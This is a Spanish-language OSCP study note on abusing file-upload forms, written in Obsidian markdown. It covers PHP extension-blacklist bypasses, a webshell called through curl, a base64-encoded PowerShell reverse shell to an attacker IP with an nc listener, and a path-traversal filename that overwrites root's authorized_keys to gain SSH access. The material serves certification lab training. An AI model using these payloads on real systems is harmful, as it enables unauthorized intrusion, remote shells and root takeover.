---
tipo: tecnica
fase: explotacion
so: 
tags: [oscp, tecnica, explotacion, web]
fecha: 2026-09-28
---

# File Upload

> [!abstract] Qué es y cuándo usarla
> Abusar de un formulario de subida de ficheros. Tres categorías: **(1)** subir un fichero **ejecutable** (webshell → RCE); **(2)** combinar el upload con **otra vuln** (directory traversal para sobrescribir ficheros, XXE/XSS en SVG); **(3)** requiere **interacción** de usuario (macro en `.docx`). En OSCP nos centramos en (1) y (2).

## Localizar el upload
Avatares en un CMS, secciones de empleo (CV), casos de uso de empresa (bufete → subir "expedientes"). A veces no es obvio → no saltarse la enumeración.

## Categoría 1: subir ejecutable (webshell)
Probar primero un `.txt` (¿acepta cualquier tipo?), luego la webshell. Si hay **blacklist** de `.php`:
- **Extensiones alternativas**: `.phps`, `.php7`, `.phtml`.
- **Mayúsculas**: `.pHP` (si el filtro compara solo contra minúsculas).
- **Renombrar**: subir `.txt` y renombrar a `.php` si la app lo permite.

```bash
# tras subir simple-backdoor.pHP a /uploads, ejecutar
curl "http://target/meteor/uploads/simple-backdoor.pHP?cmd=dir"       # Windows
curl "http://target/meteor/uploads/simple-backdoor.pHP?cmd=whoami"
```
Webshells listas en Kali: `/usr/share/webshells/` (asp, aspx, cfm, jsp, perl, php, laudanum).

### Reverse shell en Windows (PowerShell base64)
```powershell
# en Kali (pwsh) codificar el one-liner en UTF-16LE + base64
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);...'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
[Convert]::ToBase64String($Bytes)
```
```bash
nc -nvlp 4444    # listener
curl "http://target/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<base64>"
```

## Categoría 2: no-ejecutable + directory traversal
Si no puedes ejecutar lo subido, mete un path relativo en el **filename** (interceptar en Burp) para **sobrescribir** ficheros sensibles. Ej.: `authorized_keys` de root:
```bash
ssh-keygen                          # genera par (ej. "fileup")
cat fileup.pub > authorized_keys    # authorized_keys = NUESTRA clave pública
```
Interceptar upload → cambiar `filename` a:
```
../../../../../../../root/.ssh/authorized_keys
```
```bash
rm ~/.ssh/known_hosts               # evita error de host key si conectaste antes
ssh -p 2222 -i fileup root@target
```

> [!tip] Comprueba qué pasa al subir el **mismo fichero dos veces**: si dice "ya existe" → brute force del contenido del server; si da error → puede filtrar lenguaje/tecnología.

> [!warning] Detección / problemas
> - Muchas apps con web server propio corren como **root/Administrator** → sobrescribir da acceso privilegiado.
> - Sobrescribir a ciegas en producción puede **destruir datos / tumbar el servicio**.
> - No siempre sabes si el path relativo se aplicó (la respuesta puede solo hacer eco del filename).

## Visto en
- Módulo: [[09 - Common Web Application Attacks]]
- Cheatsheet: [[Web]] · [[Explotacion y Shells]]
- Máquinas: [[]]
